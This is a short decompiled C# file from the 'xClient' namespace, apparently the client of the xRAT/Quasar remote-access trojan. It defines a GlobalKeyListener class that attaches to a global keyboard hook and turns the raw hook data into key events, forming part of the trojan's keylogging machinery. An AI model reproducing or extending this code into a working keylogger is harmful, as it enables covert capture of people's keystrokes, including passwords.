using System;
using System.Collections.Generic;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x02000064 RID: 100
	internal class GlobalKeyListener : KeyListener
	{
		// Token: 0x060002B7 RID: 695 RVA: 0x000033E5 File Offset: 0x000015E5
		public GlobalKeyListener() : base(new Subscribe(HookHelper.HookGlobalKeyboard))
		{
		}

		// Token: 0x060002B8 RID: 696 RVA: 0x000033F9 File Offset: 0x000015F9
		protected override IEnumerable<KeyPressEventArgsExt> GetPressEventArgs(CallbackData data)
		{
			return KeyPressEventArgsExt.FromRawDataGlobal(data);
		}

		// Token: 0x060002B9 RID: 697 RVA: 0x00003401 File Offset: 0x00001601
		protected override KeyEventArgsExt GetDownUpEventArgs(CallbackData data)
		{
			return KeyEventArgsExt.FromRawDataGlobal(data);
		}
	}
}
